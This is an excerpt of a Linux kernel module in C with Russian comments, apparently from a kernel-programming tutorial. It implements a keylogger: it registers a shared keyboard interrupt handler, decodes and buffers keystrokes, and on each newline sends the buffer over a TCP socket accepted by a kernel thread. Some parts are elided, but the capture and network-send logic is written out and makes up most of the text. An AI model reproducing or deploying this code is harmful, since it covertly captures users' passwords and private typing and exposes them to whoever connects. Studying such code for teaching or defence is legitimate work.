...
struct keylog_data {
	...
	spinlock_t lock;		// спинлок для защиты работы со структурой
	struct work_struct workq;	// структура задания
} k_data;

struct acc_socket { 
	spinlock_t lock;   		// спинлок для защиты работы с сокетом
	struct task_struct *thread;	// task_struct для описания потока	
	struct socket 	*sock;   	// сокет для принимаемого соединения
} s_data;
...
static void flush_data( struct work_struct *work ) {
	unsigned long flags;
	if (s_data.sock == NULL) {
		printk (KERN_INFO "08.7 - In Workqueue. No socket.\n");
		return;
	}	
	struct keylog_data *kdata = container_of(work, struct keylog_data, workq);
	printk (KERN_INFO "08.7 - In Workqueue. Flushing\n");
	...
	if ((s_data.sock != NULL) && (len > 0)) {
		spin_lock(&s_data.lock);	
		my_tcp_msgsend(s_data.sock,buffer);
...
static irqreturn_t my_interrupt( int irq, void *dev_id ) {
	...
	if ((pressed=is_key_pressed(scancode))) {
		...
		if ( ch == '\n' ) {
			printk (KERN_INFO "08.7 - Got new line. Sheduling flush workqueue\n");
...
static int listen_sock_create(void) {
	...
	printk(KERN_INFO "08.7 - Listening on socket.\n");
	return 0;
}

int accepting_sock_create(void *data) { 
	struct acc_socket *sock_data = (struct acc_socket *) data;
	spin_lock(&sock_data->lock);  // Устанавливаем блокировку
	// создание принимающего сокета
	sock_create_lite(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock_data->sock);
	sock_data->sock->ops = sock->ops;
	// блокирующая операция
	sock->ops->accept(sock,sock_data->sock, 0, true);
	spin_unlock(&sock_data->lock);     // Снимаем блокировку
	printk(KERN_INFO "08.7 - Accepting connection on socket.\n");
	do_exit(0);
}
...
static int __init my_init( void ) {
	...
	if ( request_irq( irq, my_interrupt, IRQF_SHARED, "my_interrupt", &k_data ) )
		return -1;
	printk( KERN_INFO "08.7 - Successfully loading ISR handler on IRQ %d\n", irq );
	INIT_WORK( &k_data.workq, flush_data );
	listen_sock_create();
	// инициализация спинлока защиты сокета
	spin_lock_init(&s_data.lock);
	// создание и запуск потока ядра
	printk( KERN_INFO "08.7 - Making thread accepting socket \n");
	s_data.thread = kthread_run (accepting_sock_create, (void *)&s_data, "%skthread%d", "kl_", 0 );
	printk( KERN_INFO "08.7 - Thread started\n");
	return 0;
}
...
static void __exit my_exit( void ) {
	...
	synchronize_irq( irq );
	free_irq( irq, &k_data );
	printk( KERN_INFO "08.7 - Successfully unloading, irq_counter = %d\n", irq_counter );
	...
	printk (KERN_INFO "08.7 - Buffer: [%d] %s\n",len,buffer);
	spin_unlock_irqrestore(&k_data.lock,flags);
	kfree(buffer);
	kthread_stop(s_data.thread); // завершение работы потока
	if (s_data.sock != NULL)
		sock_release(s_data.sock);
	sock_release(sock);
}
module_init( my_init );
module_exit( my_exit );
